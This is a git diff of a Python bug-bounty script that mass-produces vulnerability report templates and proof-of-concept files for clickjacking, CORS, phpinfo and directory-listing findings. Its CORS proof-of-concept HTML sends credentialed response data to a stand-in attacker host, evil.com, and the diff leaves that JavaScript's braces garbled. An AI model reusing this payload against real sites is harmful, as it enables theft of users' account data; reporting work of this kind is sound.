@@ -1,19 +1,68 @@
 from urllib.request import urlopen
 import requests
 from sys import argv, exit
+import os
 
 __author__ = 'HARSHAD_PACHORE'
-#PHPINFO
+#PHPINFO POC 
 def create_poc3(url,incr):
     BASE = 'https://render-tron.appspot.com/screenshot/'
     url1 = str(url)
     print(url1)
-    path = str(incr)+'S.jpg'
+    path = str(incr)+'POC.jpg'
+    save_path = './PHPINFO/Report#'+str(incr)
+    completeName = os.path.join(save_path, path)
     response = requests.get(BASE + url1 + "/?width=1440&height=825", stream=True)
     if response.status_code == 200:
-        with open(path, 'wb') as file:
+        with open(completeName, 'wb') as file:
             for chunk in response:
                 file.write(chunk)   
+
+def create_poc4(url,incr):
+    BASE = 'https://render-tron.appspot.com/screenshot/'
+    url1 = str(url)
+    print(url1)
+    path = 'POC'+str(incr)+'.jpg'
+    save_path = './DirectoryListing/Report#'+str(incr)
+    completeName = os.path.join(save_path, path)
+    response = requests.get(BASE + url1 + "/?width=1440&height=825", stream=True)
+    if response.status_code == 200:
+        with open(completeName, 'wb') as file:
+            for chunk in response:
+                file.write(chunk) 
+
+#DIRECTORY LISTING
+def create_rep4(url,date,incr):
+    ''' create HTML page of given URL '''
+
+    code = """
+Name: Harshad Pachore
+Contact: pachoreharshad21@gmail.com
+Date : {}
+
+Vulnerability name: Directory Listing
+
+Vulnerable Url: {}
+
+Summary: 
+Researcher has found a directory listing exposure to websites. A directory listing provides an attacker with the complete index of all the resources located inside of the directory as well as download or access its contents. 
+While the researcher did not dig deeper into the available files, it might be possible that these websites host sensitive information like private videos which can publicly be downloaded or accessed by any user.
+Impact:
+A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible. The files can possibly expose sensitive information as well as sensitive files like private videos or photos.
+
+POC Screenshot attached
+
+
+    """.format(date,url)
+    path = 'Report#'+str(incr)+'.docx'
+    save_path = './DirectoryListing/Report#'+str(incr)
+    completeName = os.path.join(save_path, path)
+    os.mkdir(save_path)
+    with open(completeName, "w") as f:
+        f.write(code)
+        f.close()
+
+#PHP INFO REPORT
 
 def create_rep3(url,date,incr):
     ''' create HTML page of given URL '''
@@ -44,8 +93,11 @@ https://hackerone.com/reports/165930
 POC Screenshot attached
 
     """.format(date,url,url)
-
-    with open(str(incr)+"Report#P.docx", "w") as f:
+    path = 'Report#'+str(incr)+'.docx'
+    save_path = './PHPINFO/Report#'+str(incr)
+    completeName = os.path.join(save_path, path)
+    os.mkdir(save_path)
+    with open(completeName, "w") as f:
         f.write(code)
         f.close()
     
@@ -96,8 +148,11 @@ POC is in the attachments. Thanks, waiting for your response.
 
 
     """.format(date,url,url,url)
-
-    with open(str(incr)+"Report#CL.docx", "w") as f:
+    path = 'Report#'+str(incr)+'.docx'
+    save_path = './CLICKJ/Report#'+str(incr)
+    completeName = os.path.join(save_path, path)
+    os.mkdir(save_path)
+    with open(completeName, "w") as f:
         f.write(code)
         f.close()
 
@@ -117,8 +172,10 @@ def create_poc(url,incr):
 </body>
 </html>
     """.format(url)
-
-    with open(str(incr)+"CLPOC.html", "w") as f:
+    path = 'POC'+str(incr)+'.html'
+    save_path = './CLICKJ/Report#'+str(incr)
+    completeName = os.path.join(save_path, path)
+    with open(completeName, "w") as f:
         f.write(code)
         f.close()
 
@@ -126,6 +183,8 @@ def create_poc(url,incr):
 
 def create_poc2(url,incr):
     ''' create HTML page of given URL '''
+    c1="{"
+    c2="}"
 
     code = """
 <!DOCTYPE html>
@@ -138,28 +197,30 @@ def create_poc2(url,incr):
 <button type='button' onclick='cors()'>Exploit</button>
 <p id='demo'></p>
 <script>
-function cors() {
+function cors() {}
 var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
+xhttp.onreadystatechange = function() {}
+if (this.readyState == 4 && this.status == 200) {}
 var a = this.responseText; // Sensitive data from blog.yelp.com about user account
 document.getElementById("demo").innerHTML = a;
 xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
 xhttp.withCredentials = true;
 console.log(a);
 xhttp.send("data="+a);
-}
-};
-xhttp.open("GET", "https://app.zpkolhapur.gov.in:443/wp-json", true);
+{}
+{};
+xhttp.open("GET", "{}", true);
 xhttp.withCredentials = true;
 xhttp.send();
-}
+{}
 </script>
 </body>
 </html>
-    """.format(url)
-
-    with open(str(incr)+"CORSPOC.html", "w") as f:
+    """.format(c1,c1,c1,c2,c2,url,c2)
+    path = 'POC'+str(incr)+'.html'
+    save_path = './CORS/Report#'+str(incr)
+    completeName = os.path.join(save_path, path)
+    with open(completeName, "w") as f:
         f.write(code)
         f.close()
 
@@ -200,8 +261,11 @@ FIX 2 - It's also possible to create a rewrite rule on .htaccess (if the webserv
 POC Screenshot,HTML file attached.
 
     """.format(date,url,url,url,url)
-
-    with open(str(incr)+"Report#C.docx", "w") as f:
+    path = 'Report#'+str(incr)+'.docx'
+    save_path = './CORS/Report#'+str(incr)
+    completeName = os.path.join(save_path, path)
+    os.mkdir(save_path)
+    with open(completeName, "w") as f:
         f.write(code)
         f.close()
 
@@ -236,11 +300,11 @@ ____________________________________________________________________
             THIS TOOL IS FOR BASIC VULNERAILITY SCANING """+bcolors.ENDC+ bcolors.HEADER + """
 ____________________________________________________________________ 
    """+ bcolors.ENDC)
-        print(bcolors.BOLD + "\nChoice Report Templet : \n\n 1] Clickjaking Report \n 2] CORS Report \n 3] PHPINFO Page \n" + bcolors.ENDC)
+        print(bcolors.BOLD + "\nChoice Report Templet : \n\n 1] Clickjaking Report \n 2] CORS Report \n 3] PHPINFO Page \n 4] Directory listing \n" + bcolors.ENDC)
         val = int(input(bcolors.OKCYAN +"Enter your choice : "+ bcolors.ENDC))
     else:
         val=int(argv[3])
-    incr = 0
+    incr = 1
 
     for site in sites[0:]:
         
@@ -249,23 +313,29 @@ ____________________________________________________________________
             create_rep1(site.split('\n')[0],dat,incr)
             print(bcolors.HEADER +"Report Created.\n"+bcolors.ENDC)
             create_poc(site.split('\n')[0],incr)
-            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & <URL>.html")
+            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & <URL>.html"+bcolors.ENDC)
             incr=incr+1
         elif val==2 :
-            print("\n[*]Writing Report for " + site)
+            print(bcolors.OKBLUE +"\n[*]Writing Report for "+ bcolors.ENDC + bcolors.OKGREEN + site + bcolors.ENDC)
             create_rep2(site.split('\n')[0],dat,incr)
             print("Report Created.\n")
-            #create_poc2(site.split('\n')[0],incr)
-            #print(" [*] Created a POC and saved to <URL>.html")
+            create_poc2(site.split('\n')[0],incr)
+            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & <URL>.html"+bcolors.ENDC)
             incr=incr+1
         elif val==3:
-            print("\n[*]Writing Report for " + site)
+            print(bcolors.OKBLUE +"\n[*]Writing Report for "+ bcolors.ENDC + bcolors.OKGREEN + site + bcolors.ENDC)
             create_rep3(site.split('\n')[0],dat,incr)
-            print("Report Created.\n")
+            print(bcolors.HEADER +"Report Created.\n"+bcolors.ENDC)
             create_poc3(site.split('\n')[0],incr)
-            print(" [*] Created a POC and saved to screenshot.png")
+            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & Screenshot"+bcolors.ENDC)
+        elif val==4:
+            print(bcolors.OKBLUE +"\n[*]Writing Report for "+ bcolors.ENDC + bcolors.OKGREEN + site + bcolors.ENDC)
+            create_rep4(site.split('\n')[0],dat,incr)
+            print(bcolors.HEADER +"Report Created.\n"+bcolors.ENDC)
+            create_poc4(site.split('\n')[0],incr)
+            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & Screenshot"+bcolors.ENDC)
         else:
-            print("Enter valid option")
+            print(bcolors.FAIL+"Enter valid option"+bcolors.ENDC)
 
         
 		
